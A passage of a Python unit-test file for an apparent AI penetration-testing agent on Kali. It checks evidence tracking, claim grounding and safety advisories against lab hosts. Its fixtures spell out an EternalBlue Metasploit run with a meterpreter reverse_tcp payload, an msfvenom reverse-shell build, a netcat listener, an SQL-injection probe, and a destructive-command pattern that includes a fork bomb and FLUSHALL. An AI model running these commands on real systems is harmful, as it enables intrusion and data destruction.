        stages = {fact.stage for fact in ledger.facts_for_evidence_id(probe.evidence_id)}
        self.assertIn(deep_agent.EvidenceStage.SQL_ERROR_EXPOSED, stages)
        sql_fact = next(f for f in ledger.facts_for_evidence_id(probe.evidence_id)
                        if f.stage == deep_agent.EvidenceStage.SQL_ERROR_EXPOSED)
        self.assertEqual(sql_fact.validator, "curl_sql_error_parser_v1")
        self.assertIn("parameter", sql_fact.value)
        clean = ledger.record_command({
            "command": "curl -sS 'http://127.0.0.1/test.php?id=1'",
            "execution_state": "completed", "exit_code": 0,
            "stdout": "<b>Warning</b>: You have an error in your SQL syntax",
            "stderr": "", "timed_out": False, "output_truncated": False,
        })
        self.assertNotIn(
            deep_agent.EvidenceStage.SQL_ERROR_EXPOSED,
            {fact.stage for fact in ledger.facts_for_evidence_id(clean.evidence_id)})

    def test_playbook_offers_dir_enumeration_and_sqli_probe(self):
        records = [{
            "facts": [
                {"stage": "WEB_APP_CONFIRMED", "value": {
                    "scheme": "http", "host": "127.0.0.1", "port": 80, "route": "/"}},
                {"stage": "REFLECTION_FOUND", "value": {
                    "scheme": "http", "host": "127.0.0.1", "port": 80,
                    "route": "/test.php", "parameter": "id"}},
            ],
        }]
        suggestions = deep_agent._playbook_suggestions(
            deep_agent.KaliWorkflow("assess 127.0.0.1"), records)
        self.assertTrue(any("gobuster dir" in s for s in suggestions))
        self.assertTrue(any("=1%27" in s for s in suggestions))
        self.assertFalse(any("REFLECT-probe" in s for s in suggestions))

    def test_reasoning_leak_stripped_and_playbook_offers_https_fallback(self):
        reply = deep_agent._normalize_reply({"content":
            "thoughts about the ip</ifm|think>Your IP is 10.0.2.15."})
        self.assertEqual(reply["content"], "Your IP is 10.0.2.15.")
        unterminated = deep_agent._normalize_reply({"content":
            "Use https next.\n<ifm|think>rambling without a closing tag"})
        self.assertEqual(unterminated["content"], "Use https next.")
        records = [{
            "command": "curl -sS -m 5 http://127.0.0.1:443/",
            "execution": {"exit_code": 52},
            "facts": [],
        }]
        suggestions = deep_agent._playbook_suggestions(
            deep_agent.KaliWorkflow("assess this host"), records)
        self.assertTrue(any("https://127.0.0.1:443/" in s for s in suggestions))
        with patch.dict(os.environ, {}, clear=False):
            os.environ.pop("DEEP_AGENT_K2_REASONING", None)
            deep_agent.REASONING_OVERRIDE["sticky"] = "low"
            deep_agent.REASONING_OVERRIDE["effort"] = None
            self.assertEqual(deep_agent._k2_reasoning_effort(), "low")
            deep_agent.REASONING_OVERRIDE["effort"] = "high"
            self.assertEqual(deep_agent._k2_reasoning_effort(), "high")
            deep_agent.REASONING_OVERRIDE.update({"effort": None, "sticky": None})

    def test_ungrounded_cve_ids_are_flagged_but_real_ones_pass(self):
        ledger = deep_agent.EvidenceLedger()
        with patch.object(deep_agent, "EVIDENCE_LEDGER", ledger):
            evidence = ledger.record_command({
                "evidence_id": "ev-1",
                "command": "searchsploit apache 2.4",
                "execution_state": "completed", "exit_code": 0,
                "stdout": "CVE-2021-41773 path traversal matches", "stderr": "",
                "timed_out": False, "output_truncated": False,
            })
            records = [{"evidence_id": evidence.evidence_id, "output": evidence.stdout,
                        "execution": {}}]
            flagged = deep_agent._record_summary_claim(
                "Apache is affected by CVE-2021-41773 and also CVE-2021-99999.", records)
            self.assertIn("CVE-2021-41773", flagged.split("Controller grounding note")[0])
            self.assertIn("CVE-2021-99999", flagged.split("Controller grounding note")[1])
            clean = deep_agent._record_summary_claim(
                "Only the recorded CVE-2021-41773 applies here.", records)
            self.assertNotIn("grounding note", clean)

    def test_service_status_checks_get_inferred_markers(self):
        self.assertEqual(
            deep_agent._default_expected_result("systemctl is-active wazuh-manager"), "active")
        self.assertEqual(
            deep_agent._default_expected_result("systemctl status wazuh-manager"), "active (running)")
        self.assertEqual(
            deep_agent._default_expected_result("service wazuh-manager status"), "active (running)")
        self.assertEqual(
            deep_agent._default_expected_result("systemctl is-enabled nginx"), "enabled")

    def test_malformed_json_tool_text_is_repaired(self):
        trailing = '{"name": "run_kali_command", "arguments": {"command": "id",}}'
        prose = 'Here is my plan:\n{"name": "run_kali_command", "arguments": {"command": "id"}}\nDone.'
        for text in (trailing, prose):
            with self.subTest(text=text):
                request = deep_agent._call_from_text(text)
                self.assertIsNotNone(request)
                self.assertEqual(json.loads(request["function"]["arguments"])["command"], "id")
        self.assertIsNone(deep_agent._call_from_text("no json here at all"))

    def test_matched_verify_marker_records_a_verified_finding(self):
        ledger = deep_agent.EvidenceLedger()
        with patch.object(deep_agent, "EVIDENCE_LEDGER", ledger):
            workflow = deep_agent.KaliWorkflow(
                "check the lab target", requires_goal_check=True,
            )
            workflow.begin(
                "curl -fsS -m 8 -i http://127.0.0.1:8080/",
                purpose="verify", expected_result="HTTP/1.1 200 OK",
            )
            record = {
                "evidence_id": "finding-evidence-1",
                "command": "curl -fsS -m 8 -i http://127.0.0.1:8080/",
                "execution_state": "completed", "exit_code": 0,
                "stdout": "HTTP/1.1 200 OK\n", "stderr": "",
                "timed_out": False, "output_truncated": False,
            }
            ledger.record_command(dict(record))
            self.assertIsNone(deep_agent._finish_workflow_command(workflow, {
                **record,
                "workflow_purpose": "verify",
                "expected_result": "HTTP/1.1 200 OK",
                "expected_result_match": True,
            }))
            facts = [fact for fact in ledger.facts
                     if fact.stage == deep_agent.EvidenceStage.SECURITY_FINDING_VERIFIED]
            self.assertEqual(len(facts), 1)
            self.assertEqual(facts[0].validator, "workflow_marker_match_v1")

    def test_old_tool_results_are_compacted_but_recent_ones_stay_raw(self):
        ledger = deep_agent.EvidenceLedger()
        for evidence_id, command, stream in (("ev-old", "old", "x" * 5000),
                                             ("ev-new", "new", "y" * 5000)):
            ledger.record_command({"evidence_id": evidence_id, "command": command,
                                   "execution_state": "completed", "exit_code": 0,
                                   "stdout": stream, "stderr": ""})
        messages = [
            {"role": "user", "content": "task"},
            {"role": "assistant", "content": "", "tool_calls": [
                deep_agent._make_tool_call("run_kali_command", {"command": "old"})]},
            {"role": "tool", "tool_call_id": "old", "content": json.dumps({
                "command_evidence": {"evidence_id": "ev-old", "command": "old",
                                     "execution_state": "completed", "exit_code": 0,
                                     "stdout": "x" * 5000, "stderr": ""},
            })},
            {"role": "assistant", "content": "", "tool_calls": [
                deep_agent._make_tool_call("run_kali_command", {"command": "new"})]},
            {"role": "tool", "tool_call_id": "new", "content": json.dumps({
                "command_evidence": {"evidence_id": "ev-new", "command": "new",
                                     "execution_state": "completed", "exit_code": 0,
                                     "stdout": "y" * 5000, "stderr": ""},
            })},
        ]
        with (patch.object(deep_agent, "TOOL_RESULT_KEEP_LIMIT", 1),
              patch.object(deep_agent, "EVIDENCE_LEDGER", ledger)):
            deep_agent._compact_previous_tool_results(messages)
        old = json.loads(messages[2]["content"])
        self.assertTrue(old["evidence_compact"])
        self.assertEqual(old["evidence_id"], "ev-old")
        self.assertLess(len(messages[2]["content"]), 2000)
        self.assertGreater(len(messages[4]["content"]), 1200)

    def test_compaction_preserves_full_evidence_and_tail_marker_verification(self):
        ledger = deep_agent.EvidenceLedger()
        stream = "HTTP/1.1 200 OK\n\n" + "recorded response\n" * 300 + "TAIL_MARKER\n"
        evidence = ledger.record_command({
            "evidence_id": "ev-tail", "command": "curl -i https://127.0.0.1/",
            "execution_state": "completed", "exit_code": 0, "stdout": stream,
            "stderr": "", "timed_out": False, "output_truncated": False,
        })
        messages = [{"role": "user", "content": "verify the local response"},
                    {"role": "assistant", "content": "", "tool_calls": [deep_agent._make_tool_call(
                        "run_kali_command", {"command": evidence.command, "purpose": "verify",
                                             "expected_result": "TAIL_MARKER"}, "call-tail")]},
                    {"role": "tool", "tool_call_id": "call-tail",
                     "content": deep_agent._structured_tool_output(evidence)},
                    {"role": "tool", "tool_call_id": "recent", "content": "recent result"}]
        with (patch.object(deep_agent, "TOOL_RESULT_KEEP_LIMIT", 1),
              patch.object(deep_agent, "EVIDENCE_LEDGER", ledger)):
            before = deep_agent._execution_records(messages)
            before_length = len(messages[-2]["content"])
            deep_agent._compact_previous_tool_results(messages)
            after = deep_agent._execution_records(messages)
        self.assertLess(len(messages[-2]["content"]), before_length)
        self.assertIn("TAIL_MARKER", messages[-2]["content"])
        self.assertEqual(after, before)
        self.assertTrue(after[0]["execution"]["expected_result_match"])
        self.assertTrue(after[0]["facts"])
        self.assertEqual(ledger.command_by_evidence_id("ev-tail").stdout, stream)

    def test_compaction_keeps_command_output_without_recoverable_evidence(self):
        content = json.dumps({"command_evidence": {
            "evidence_id": "unavailable", "command": "cat /tmp/result.log",
            "stdout": "irreplaceable recorded output\n" * 250,
        }})
        messages = [{"role": "tool", "content": content},
                    {"role": "tool", "content": "recent result"}]
        with (patch.object(deep_agent, "TOOL_RESULT_KEEP_LIMIT", 1),
              patch.object(deep_agent, "EVIDENCE_LEDGER", deep_agent.EvidenceLedger())):
            deep_agent._compact_previous_tool_results(messages)
        self.assertEqual(messages[0]["content"], content)


class WebWorkflowRegressionTests(unittest.TestCase):
    def test_inferred_http_marker_matches_versioned_headers_without_weakening_word_markers(self):
        record = {"command": "curl -sS -i https://127.0.0.1/", "execution_state": "completed",
                  "exit_code": 0, "stdout": "HTTP/1.1 302 Found\r\n\r\n", "stderr": ""}
        expected = deep_agent._default_expected_result(record["command"])
        self.assertIs(deep_agent.expected_result_matches(expected, record), True)
        for output in ("inactive", "reactivated", "activeish"):
            self.assertIs(deep_agent.expected_result_matches("active", {**record, "stdout": output}), False)
        self.assertIsNone(deep_agent.expected_result_matches(expected, {**record, "exit_code": 60}))

    def record(self, command, stdout="", *, code=0):
        ledger = deep_agent.EvidenceLedger()
        evidence = ledger.record_command({
            "command": command, "execution_state": "completed", "exit_code": code,
            "stdout": stdout, "stderr": "", "timed_out": False, "output_truncated": False,
        })
        return {"command": command, "execution": evidence.to_dict(include_streams=False),
                "facts": [fact.to_dict() for fact in ledger.facts_for_evidence_id(evidence.evidence_id)]}

    def scan(self):
        return self.record(
            "nmap -n -sT -sV --top-ports 100 --host-timeout 45s 127.0.0.1",
            "Nmap scan report for 127.0.0.1\nPORT STATE SERVICE\n"
            "22/tcp open ssh\n80/tcp open http\n443/tcp open ssl/https\n",
        )

    def test_observed_tls_and_ports_stay_separate_and_do_not_repeat_scan(self):
        workflow = deep_agent.KaliWorkflow("assess 127.0.0.1", scope_target="127.0.0.1")
        workflow.port_discovery_complete = True
        workflow.discovered_tcp_ports = {22, 80, 443}
        page = self.record("curl -sS -m 8 -i http://127.0.0.1:80/", "HTTP/1.1 200 OK\r\n\r\nTicTacToe")
        suggestions = deep_agent._playbook_suggestions(workflow, [self.scan(), page])
        self.assertIn("https://127.0.0.1:443/", suggestions[0])
        self.assertFalse(any(":22" in cmd or "http://127.0.0.1:443" in cmd or "nmap" in cmd for cmd in suggestions))
        for command in suggestions:
            self.assertIsNone(deep_agent._model_command_issue(
                command, workflow.request, "127.0.0.1", known_tcp_ports={22, 80, 443},
            ), command)

    def test_protocol_guard_uses_recorded_tls_without_blocking_other_ports_or_text(self):
        records = [self.scan()]
        issue = deep_agent._observed_http_protocol_issue("curl -sS http://127.0.0.1:443/", records)
        self.assertIn("https://127.0.0.1:443/", issue)
        for command in ("curl -sS http://127.0.0.1:80/", "curl -sS https://127.0.0.1:443/",
                        "printf 'http://127.0.0.1:443/'"):
            self.assertIsNone(deep_agent._observed_http_protocol_issue(command, records))

    def test_login_redirect_is_inspected_before_inventing_inputs(self):
        response = self.record("curl -ksS -m 8 -i https://127.0.0.1:443/",
                               "HTTP/1.1 302 Found\r\nLocation: /app/login?\r\n\r\n")
        suggestions = deep_agent._playbook_suggestions(
            deep_agent.KaliWorkflow("assess 127.0.0.1", scope_target="127.0.0.1"), [response])
        self.assertIn("https://127.0.0.1:443/app/login", suggestions[0])
        self.assertIn("-ksS", suggestions[0])
        self.assertFalse(any("REFLECT-probe" in cmd or "gobuster" in cmd or "|" in cmd for cmd in suggestions))
        visited = self.record(suggestions[0], "HTTP/1.1 200 OK\r\n\r\nLogin page")
        later = deep_agent._playbook_suggestions(deep_agent.KaliWorkflow("identify app"), [response, visited])
        self.assertEqual(later, [])

    def test_redirects_outside_origin_and_followed_redirects_are_not_misattributed(self):
        for location in ("https://other.example/login", "https://127.0.0.1:8443/login"):
            with self.subTest(location=location):
                response = self.record("curl -sS -i https://127.0.0.1:443/",
                                       f"HTTP/1.1 302 Found\r\nLocation: {location}\r\n\r\n")
                self.assertEqual(deep_agent._playbook_suggestions(deep_agent.KaliWorkflow("identify app"), [response]), [])
        followed = self.record("curl -sS -Li http://127.0.0.1/",
                               "HTTP/1.1 302 Found\r\nLocation: https://other.example/\r\n\r\n"
                               "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<form><input name=q></form>")
        self.assertEqual(followed["facts"], [])

    def test_only_advertised_get_inputs_get_standalone_reflection_checks(self):
        response = self.record("curl -sS -i http://127.0.0.1:80/",
            'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n'
            '<form action="/search" method="get"><input name="term"><input type="password" name="pw"></form>'
            '<form action="/login" method="post"><input name="user"></form>'
            '<a href="https://other.example/?x=1">external</a>')
        inputs = [fact["value"] for fact in response["facts"] if fact["stage"] == "INPUT_SURFACE_FOUND"]
        self.assertEqual([item["parameter"] for item in inputs], ["term"])
        suggestions = deep_agent._playbook_suggestions(
            deep_agent.KaliWorkflow("assess 127.0.0.1", scope_target="127.0.0.1"), [response])
        reflection = next(cmd for cmd in suggestions if "REFLECT-probe" in cmd)
        self.assertIn("/search?term=", reflection)
        self.assertNotIn("|", reflection)
        self.assertEqual(deep_agent._default_expected_result(reflection), "HTTP/")
        attempted = self.record(reflection, "HTTP/1.1 200 OK\r\n\r\nNo reflection")
        self.assertNotIn(reflection, deep_agent._playbook_suggestions(deep_agent.KaliWorkflow("assess app"), [response, attempted]))

    def test_request_query_alone_does_not_prove_an_advertised_input(self):
        response = self.record("curl -sS -i http://127.0.0.1/?q=guessed",
                               "HTTP/1.1 302 Found\r\nLocation: /login\r\n\r\n")
        suggestions = deep_agent._playbook_suggestions(deep_agent.KaliWorkflow("assess app"), [response])
        self.assertFalse(any("REFLECT-probe" in cmd for cmd in suggestions))

    def test_reflection_evidence_on_another_port_cannot_trigger_a_probe(self):
        response = self.record("curl -sS -i http://127.0.0.1:80/", "HTTP/1.1 200 OK\r\n\r\nPage")
        other_port = self.record("curl -sS https://127.0.0.1:443/?id=marker123456", "marker123456")
        suggestions = deep_agent._playbook_suggestions(deep_agent.KaliWorkflow("assess app"), [response, other_port])
        self.assertFalse(any("%27" in cmd for cmd in suggestions))

    def test_body_only_curl_does_not_get_an_impossible_header_expectation(self):
        for command in ("curl -sS https://127.0.0.1/", "curl -H '-include' http://127.0.0.1/",
                        "curl -o '-index.html' http://127.0.0.1/"):
            self.assertEqual(deep_agent._default_expected_result(command), "", command)
        for command in ("curl -sSI https://127.0.0.1/", "curl --include http://127.0.0.1/",
                        "sudo curl -sS -m 8 -i http://127.0.0.1/"):
            self.assertEqual(deep_agent._default_expected_result(command), "HTTP/", command)
        empty = self.record("curl -sS https://127.0.0.1/?q=REFLECT-probe-92f3fa")
        self.assertFalse(any(fact["stage"] == "REFLECTION_FOUND" for fact in empty["facts"]))

    def test_certificate_recovery_is_local_bounded_and_not_an_http_error_fallback(self):
        local = self.record("curl -fsS -m 8 -I https://127.0.0.1:443/", code=60)
        suggestions = deep_agent._playbook_suggestions(deep_agent.KaliWorkflow("identify app"), [local])
        self.assertIn("-ksS -m 8 -i", suggestions[0])
        self.assertEqual(local["facts"], [])
        remote = self.record("curl -sS -i https://other.example/", code=60)
        not_found = self.record("curl -fsS -i http://127.0.0.1/missing", code=22)
        self.assertEqual(deep_agent._playbook_suggestions(deep_agent.KaliWorkflow("identify app"), [remote, not_found]), [])


class ExploitReachabilityAdvisoryTests(unittest.TestCase):
    def record(self, ledger, evidence_id, command, stdout, exit_code=0):
        return ledger.record_command({
            "evidence_id": evidence_id,
            "command": command,
            "state": "OBSERVED",
            "execution_state": "completed",
            "exit_code": exit_code,
            "stdout": stdout,
            "stderr": "",
            "timed_out": False,
            "duration_seconds": 0.01,
        })

    def structured_output(self, ledger, evidence):
        with patch.object(deep_agent, "EVIDENCE_LEDGER", ledger):
            return json.loads(deep_agent._structured_tool_output(evidence))

    def test_advisory_flags_lhost_absent_from_recorded_addresses(self):
        ledger = deep_agent.EvidenceLedger()
        self.record(
            ledger, "ev-preflight",
            "ip -j -4 address show && ip -j -4 route get 192.168.56.102",
            '[{"ifname":"lo","addr_info":[{"family":"inet","local":"127.0.0.1","prefixlen":8}]},'
            '{"ifname":"eth0","addr_info":[{"family":"inet","local":"10.0.2.15","prefixlen":24}]}]\n'
            '[{"dst":"192.168.56.102","prefsrc":"10.0.2.15"}]',
        )
        self.record(
            ledger, "ev-scan",
            "nmap -sT -sV -p 445 192.168.56.102",
            "Nmap scan report for 192.168.56.102\n445/tcp open  microsoft-ds",
        )
        exploit = self.record(
            ledger, "ev-msf",
            "cat > /tmp/msf.rc <<'EOF'\nuse exploit/windows/smb/ms17_010_eternalblue\n"
            "set RHOSTS 192.168.56.102\nset LHOST 192.168.56.101\n"
            "set PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit\nEOF\n"
            "msfconsole --quiet -q -r /tmp/msf.rc",
            "[*] Exploit completed, but no session was created.",
        )
        payload = self.structured_output(ledger, exploit)
        advisory = payload["controller_advisory"]
        self.assertEqual(advisory["kind"], "callback_reachability")
        self.assertEqual(
            [entry["address"] for entry in advisory["recorded_kali_addresses"]],
            ["10.0.2.15"],
        )
        self.assertEqual(advisory["stated_lhost"], "192.168.56.101")
        self.assertFalse(advisory["lhost_verified_on_this_vm"])
        self.assertEqual(advisory["payload_direction"], "reverse")
        self.assertTrue(advisory["rhost_reached_in_recorded_output"])
        self.assertTrue(any("192.168.56.101" in note for note in advisory["notes"]))
        self.assertTrue(any("10.0.2.15" in note for note in advisory["notes"]))

    def test_advisory_requests_interface_inspection_for_exploit_without_position(self):
        ledger = deep_agent.EvidenceLedger()
        exploit = self.record(
            ledger, "ev-msfvenom",
            "msfvenom -p windows/x64/meterpreter/reverse_tcp "
            "LHOST=192.168.56.101 LPORT=4444 -f exe",
            "Final size of exe file: 73802 bytes",
        )
        payload = self.structured_output(ledger, exploit)
        advisory = payload["controller_advisory"]
        self.assertEqual(advisory["recorded_kali_addresses"], [])
        self.assertEqual(advisory["payload_direction"], "reverse")
        self.assertTrue(any("ip -4 addr" in note for note in advisory["notes"]))

    def test_advisory_stays_silent_when_position_verified_without_issues(self):
        ledger = deep_agent.EvidenceLedger()
        self.record(
            ledger, "ev-preflight",
            "ip -j -4 address show && ip -j -4 route get 192.168.56.102",
            '[{"ifname":"eth0","addr_info":[{"family":"inet","local":"10.0.2.15","prefixlen":24}]}]\n'
            '[{"dst":"192.168.56.102","prefsrc":"10.0.2.15"}]',
        )
        exploit = self.record(
            ledger, "ev-msf",
            "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
            "set RHOSTS 192.168.56.102; set LHOST 10.0.2.15; exploit'",
            "[*] Exploit completed, but no session was created.",
        )
        payload = self.structured_output(ledger, exploit)
        self.assertIsNone(payload["controller_advisory"])

    def test_scanner_commands_and_other_outputs_carry_no_advisory(self):
        ledger = deep_agent.EvidenceLedger()
        nmap = self.record(ledger, "ev-nmap", "nmap -sT -sV -p 445 192.168.56.102", "445/tcp open")
        self.assertIsNone(self.structured_output(ledger, nmap)["controller_advisory"])
        scanner = self.record(
            ledger, "ev-scanner",
            "msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; "
            "set RHOSTS 192.168.56.102; run'",
            "[+] 192.168.56.102:445 - Host is likely VULNERABLE to MS17-010!",
        )
        self.assertIsNone(self.structured_output(ledger, scanner)["controller_advisory"])

    def test_successful_session_output_suppresses_the_advisory(self):
        ledger = deep_agent.EvidenceLedger()
        exploit = self.record(
            ledger, "ev-msf",
            "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
            "set RHOSTS 192.168.56.102; set LHOST 10.0.2.15; exploit'",
            "[*] Meterpreter session 1 opened (10.0.2.15:4444 -> 192.168.56.102:50118)",
        )
        self.assertIsNone(self.structured_output(ledger, exploit)["controller_advisory"])

    def test_interface_output_parsing_covers_text_and_json_formats(self):
        ip_addr = deep_agent._addresses_from_interface_output(
            "    inet 127.0.0.1/8 scope host lo\n"
            "    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute eth0\n"
        )
        self.assertEqual(ip_addr, [("10.0.2.15", "eth0")])
        hostname = deep_agent._addresses_from_interface_output(
            "10.0.2.15 fd17:625c:f037:2:7477:d847:fdd9:ac9b\n"
        )
        self.assertEqual(hostname, [("10.0.2.15", None)])
        ifconfig = deep_agent._addresses_from_interface_output(
            "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\n"
            "        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255\n"
        )
        self.assertEqual(ifconfig, [("10.0.2.15", "eth0")])
        json_output = deep_agent._addresses_from_json_interface_output(
            '[{"ifname":"lo","addr_info":[{"family":"inet","local":"127.0.0.1","prefixlen":8}]},'
            '{"ifname":"eth0","addr_info":[{"family":"inet","local":"10.0.2.15","prefixlen":24}]}]\n'
            '[{"dst":"192.168.56.102","prefsrc":"10.0.2.15"}]\n'
        )
        self.assertEqual(json_output, [("10.0.2.15", "eth0")])


class ObservationDisciplineTests(unittest.TestCase):
    def record(self, ledger, evidence_id, command, stdout, exit_code=0, operation=None):
        result = {
            "evidence_id": evidence_id,
            "command": command,
            "state": "OBSERVED",
            "execution_state": "completed",
            "exit_code": exit_code,
            "stdout": stdout,
            "stderr": "",
            "timed_out": False,
            "duration_seconds": 0.01,
        }
        if operation:
            result["operation"] = operation
        return ledger.record_command(result)

    def structured_output(self, ledger, evidence):
        with patch.object(deep_agent, "EVIDENCE_LEDGER", ledger):
            return json.loads(deep_agent._structured_tool_output(evidence))

    def test_observation_boundary_advisory_flags_local_inspection_after_target_work(self):
        ledger = deep_agent.EvidenceLedger()
        self.record(ledger, "ev-redis",
                    "redis-cli -h 192.168.56.104 -p 6379 config get dir",
                    "dir\n/var/spool/cron")
        probe = self.record(ledger, "ev-status", "service cron status 2>/dev/null",
                            "cron.service - Regular background program processing daemon")
        advisory = self.structured_output(ledger, probe)["controller_advisory"]
        self.assertEqual(advisory["kind"], "observation_boundary")
        self.assertEqual(advisory["recent_remote_target"], "192.168.56.104")
        self.assertIn("not observable", advisory["note"])

    def test_observation_boundary_skips_when_command_names_a_remote_host(self):
        ledger = deep_agent.EvidenceLedger()
        self.record(ledger, "ev-redis",
                    "redis-cli -h 192.168.56.104 -p 6379 config get dir",
                    "dir\n/var/spool/cron")
        aware = self.record(
            ledger, "ev-aware",
            "ls -la /var/spool/cron/crontabs/; redis-cli -h 192.168.56.104 config get dir",
            "dir\n/var/spool/cron")
        self.assertIsNone(self.structured_output(ledger, aware)["controller_advisory"])

    def test_observation_boundary_silent_without_recent_remote_targets(self):
        ledger = deep_agent.EvidenceLedger()
        self.record(ledger, "ev-local", "service cron status", "cron.service - active")
        probe = self.record(ledger, "ev-file", "cat /etc/hostname", "kali")
        self.assertIsNone(self.structured_output(ledger, probe)["controller_advisory"])

    def test_listener_advisory_fires_on_background_listeners(self):
        ledger = deep_agent.EvidenceLedger()
        for evidence_id, command in (
            ("ev-nc", "nc -nlvp 4444"),
            ("ev-msf", "start background process: msfconsole --quiet -r /tmp/listen.rc"),
        ):
            evidence = self.record(ledger, evidence_id, command,
                                   "listening on [any]: 4444 ...", operation="start_background")
            advisory = self.structured_output(ledger, evidence)["controller_advisory"]
            self.assertEqual(advisory["kind"], "listener_observability", command)
            self.assertIn("start_interactive", advisory["note"])

    def test_foreground_exploit_command_keeps_reachability_advisory(self):
        ledger = deep_agent.EvidenceLedger()
        evidence = self.record(
            ledger, "ev-msf",
            "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; "
            "set LHOST 10.0.2.15; exploit'",
            "[*] Exploit completed, but no session was created.")
        advisory = self.structured_output(ledger, evidence)["controller_advisory"]
        self.assertEqual(advisory["kind"], "callback_reachability")

    def test_ungrounded_access_claims_require_execution_evidence(self):
        answer = ("SSH root:typhoon login succeeded and we have full filesystem access "
                  "on the target.")
        claims = deep_agent._ungrounded_access_claims(answer, ["Vulnerable VM By PRISMA CSI banner"])
        self.assertTrue(any("login succeed" in claim for claim in claims))
        self.assertTrue(any("filesystem access" in claim for claim in claims))
        grounded = deep_agent._ungrounded_access_claims(
            answer, ["banner", "uid=0(root) gid=0(root) groups=0(root)"])
        self.assertEqual(grounded, [])

    def test_record_summary_claim_flags_unverified_login(self):
        answer = deep_agent._record_summary_claim(
            "SSH root:typhoon login succeeded.",
            [{"output": "Vulnerable VM By PRISMA CSI ... Please hack me!"}])
        self.assertIn("UNVERIFIED", answer)
        self.assertIn("not proof of authentication", answer)


class RootCauseFixTests(unittest.TestCase):
    def test_lab_notes_block_reads_file_and_injects_header(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            path = Path(temp_dir) / "lab_notes.md"
            self.assertEqual(deep_agent._lab_notes_block(path), "")
            path.write_text("- [2026-10-04] typhoon is rooted\n", encoding="utf-8")
            block = deep_agent._lab_notes_block(path)
            self.assertIn("Persistent lab notes", block)
            self.assertIn("typhoon is rooted", block)

    def test_prompts_carry_persistent_lab_notes_at_load(self):
        self.assertIn("Persistent lab notes", deep_agent.SHELL_SYSTEM_PROMPT)
        self.assertIn("Persistent lab notes", deep_agent.UNRESTRICTED_SYSTEM_PROMPT)

    def test_save_lab_note_tool_is_registered_for_both_modes(self):
        self.assertIn("save_lab_note", [tool["function"]["name"] for tool in deep_agent.SHELL_TOOLS])
        self.assertIn("save_lab_note", [tool["function"]["name"] for tool in deep_agent._unrestricted_tools()])

    def test_save_lab_note_appends_dated_line_and_rejects_bad_text(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            path = Path(temp_dir) / "lab_notes.md"
            with patch.object(deep_agent, "_LAB_NOTES_PATH", path):
                messages = []
                output = deep_agent._save_lab_note(messages, "typhoon 192.168.56.104: root key installed", "call-1")
                self.assertTrue(output.startswith("Saved to persistent lab notes"))
                content = path.read_text(encoding="utf-8")
                self.assertIn("root key installed", content)
                self.assertRegex(content, r"^- \[\d{4}-\d{2}-\d{2}\] ")
                self.assertEqual(messages[-1]["role"], "tool")
                for bad in ("", "   ", "x" * 501):
                    rejected = deep_agent._save_lab_note(messages, bad, "call-2")
                    self.assertIn("rejected", rejected)
                self.assertEqual(path.read_text(encoding="utf-8").count("\n"), 1)

    def test_action_thinking_budget_defaults_overrides_and_clamps(self):
        cases = [
            ({}, 2048),
            ({"DEEP_AGENT_ACTION_THINKING_TOKENS": "4096"}, 4096),
            ({"DEEP_AGENT_ACTION_THINKING_TOKENS": "99999"}, 8192),
            ({"DEEP_AGENT_ACTION_THINKING_TOKENS": "-5"}, 0),
            ({"DEEP_AGENT_ACTION_THINKING_TOKENS": "abc"}, 2048),
        ]
        for env, expected in cases:
            with patch.dict(os.environ, env):
                self.assertEqual(deep_agent._action_thinking_budget(), expected, env)

    def test_destructive_state_advisory_fires_on_state_destroying_commands(self):
        ledger = deep_agent.EvidenceLedger()
        result = ledger.record_command({
            "evidence_id": "ev-shutdown",
            "command": "redis-cli -h 192.168.56.104 SHUTDOWN NOSAVE",
            "state": "OBSERVED",
            "execution_state": "completed",
            "exit_code": 0,
            "stdout": "",
            "stderr": "",
            "timed_out": False,
            "duration_seconds": 0.01,
        })
        with patch.object(deep_agent, "EVIDENCE_LEDGER", ledger):
            payload = json.loads(deep_agent._structured_tool_output(result))
        advisory = payload["controller_advisory"]
        self.assertEqual(advisory["kind"], "destructive_state_change")
        self.assertIn("how the state could be restored", advisory["note"])

    def test_destructive_pattern_matches_the_damage_classes_and_not_probes(self):
        for command in ("redis-cli SHUTDOWN NOSAVE", "sudo service redis-server stop",
                        "systemctl disable redis", "reboot", "redis-cli FLUSHALL",
                        "kill -9 -1", ":(){ :|:& };:"):
            self.assertIsNotNone(deep_agent._DESTRUCTIVE_COMMAND_PATTERN.search(command), command)
        for command in ("systemctl status redis", "service cron status", "redis-cli ping",
                        "nmap -p 6379 192.168.56.104", "msfconsole -q -x 'use exploit/x; exploit'"):
            self.assertIsNone(deep_agent._DESTRUCTIVE_COMMAND_PATTERN.search(command), command)


if __name__ == "__main__":
    unittest.main()
